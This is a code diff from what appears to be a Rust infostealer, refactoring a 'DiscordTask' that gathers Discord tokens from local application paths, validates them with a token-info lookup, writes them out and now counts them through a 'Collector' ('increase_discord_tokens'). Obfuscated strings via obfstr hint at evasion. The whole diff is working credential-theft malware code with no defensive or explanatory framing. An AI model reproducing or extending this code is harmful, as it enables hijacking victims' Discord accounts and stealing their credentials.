@@ -3,6 +3,7 @@ use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
+use collector::{Collector, Software};
 use core::fmt::{Display, Formatter};
 use obfstr::obfstr as s;
 use requests::{Request, RequestBuilder, ResponseBodyExt};
@@ -16,11 +17,13 @@ struct TokenValidationTask {
     token: String,
 }
 
-impl Task for TokenValidationTask {
-    unsafe fn run(&self, parent: &Path) {
+impl<C: Collector> Task<C> for TokenValidationTask {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let Some(info) = get_token_info(self.token.clone()) else {
             return
         };
+
+        collector.get_software().increase_discord_tokens();
 
         let _ = info
             .to_string()
@@ -28,16 +31,16 @@ impl Task for TokenValidationTask {
     }
 }
 
-struct TokenWriterTask {
-    inner: CompositeTask
+struct TokenWriterTask<C: Collector> {
+    inner: CompositeTask<C>
 }
 
-impl TokenWriterTask {
+impl<C: Collector> TokenWriterTask<C> {
     fn new(tokens: Vec<String>) -> Self {
-        let tokens: Vec<Arc<dyn Task>> = tokens
+        let tokens: Vec<Arc<dyn Task<C>>> = tokens
             .into_iter()
             .map(|token| TokenValidationTask{ token })
-            .map(|task| Arc::new(task) as Arc<dyn Task>)
+            .map(|task| Arc::new(task) as Arc<dyn Task<C>>)
             .collect();
 
         Self {
@@ -46,18 +49,18 @@ impl TokenWriterTask {
     }
 }
 
-impl Task for TokenWriterTask {
-    unsafe fn run(&self, parent: &Path) {
-        self.inner.run(parent);
+impl<C: Collector> Task<C> for TokenWriterTask<C> {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
+        self.inner.run(parent, collector);
     }
 }
 
 pub(super) struct DiscordTask;
 
-impl Task for DiscordTask {
+impl<C: Collector> Task<C> for DiscordTask {
     parent_name!("Discord");
 
-    unsafe fn run(&self, parent: &Path) {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let mut tokens = collect_tokens(&get_discord_paths());
         tokens.sort();
         tokens.dedup();
@@ -66,7 +69,7 @@ impl Task for DiscordTask {
             return
         }
 
-        TokenWriterTask::new(tokens).run(parent);
+        TokenWriterTask::new(tokens).run(parent, collector);
     }
 }
 
